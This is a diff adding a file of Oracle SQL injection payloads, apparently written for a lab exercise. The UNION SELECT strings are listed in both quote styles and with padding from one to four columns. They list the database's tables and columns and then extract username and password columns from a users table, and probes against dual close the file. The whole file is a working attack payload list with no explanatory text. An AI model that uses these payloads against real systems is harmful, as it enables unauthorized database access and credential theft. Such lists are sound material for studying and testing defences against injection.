@@ -1,0 +1,39 @@
+' UNION SELECT table_name FROM all_tables-- -
+' UNION SELECT table_name, NULL FROM all_tables-- -
+' UNION SELECT table_name, NULL, NULL FROM all_tables-- -
+' UNION SELECT table_name, NULL, NULL, NULL FROM all_tables-- -
+
+" UNION SELECT table_name FROM all_tables-- -
+" UNION SELECT table_name, NULL FROM all_tables-- -
+" UNION SELECT table_name, NULL, NULL FROM all_tables-- -
+" UNION SELECT table_name, NULL, NULL, NULL FROM all_tables-- -
+
+' UNION SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS_PYNWJT'-- -
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_PYNWJT'-- -
+' UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name = 'USERS_PYNWJT'-- -
+' UNION SELECT column_name, NULL, NULL, NULL FROM all_tab_columns WHERE table_name = 'USERS_PYNWJT'-- -
+
+" UNION SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS_PYNWJT'-- -
+" UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_PYNWJT'-- -
+" UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name = 'USERS_PYNWJT'-- -
+" UNION SELECT column_name, NULL, NULL, NULL FROM all_tab_columns WHERE table_name = 'USERS_PYNWJT'-- -
+
+' UNION SELECT USERNAME_SFSKGM FROM USERS_PYNWJT-- -
+' UNION SELECT USERNAME_SFSKGM, PASSWORD_AUDUXY FROM USERS_PYNWJT-- -
+' UNION SELECT USERNAME_SFSKGM, PASSWORD_AUDUXY, NULL FROM USERS_PYNWJT-- -
+' UNION SELECT USERNAME_SFSKGM, PASSWORD_AUDUXY, NULL, NULL FROM USERS_PYNWJT-- -
+
+" UNION SELECT USERNAME_SFSKGM FROM USERS_PYNWJT-- -
+" UNION SELECT USERNAME_SFSKGM, PASSWORD_AUDUXY FROM USERS_PYNWJT-- -
+" UNION SELECT USERNAME_SFSKGM, PASSWORD_AUDUXY, NULL FROM USERS_PYNWJT-- -
+" UNION SELECT USERNAME_SFSKGM, PASSWORD_AUDUXY, NULL, NULL FROM USERS_PYNWJT-- -
+
+' UNION SELECT 'a' FROM dual-- -
+' UNION SELECT 'a','b' FROM dual-- -
+' UNION SELECT 'a','b','c' FROM dual-- -
+' UNION SELECT 'a','b','c','d' FROM dual-- -
+
+" UNION SELECT 'a' FROM dual-- -
+" UNION SELECT 'a','b' FROM dual-- -
+" UNION SELECT 'a','b','c' FROM dual-- -
+" UNION SELECT 'a','b','c','d' FROM dual-- -
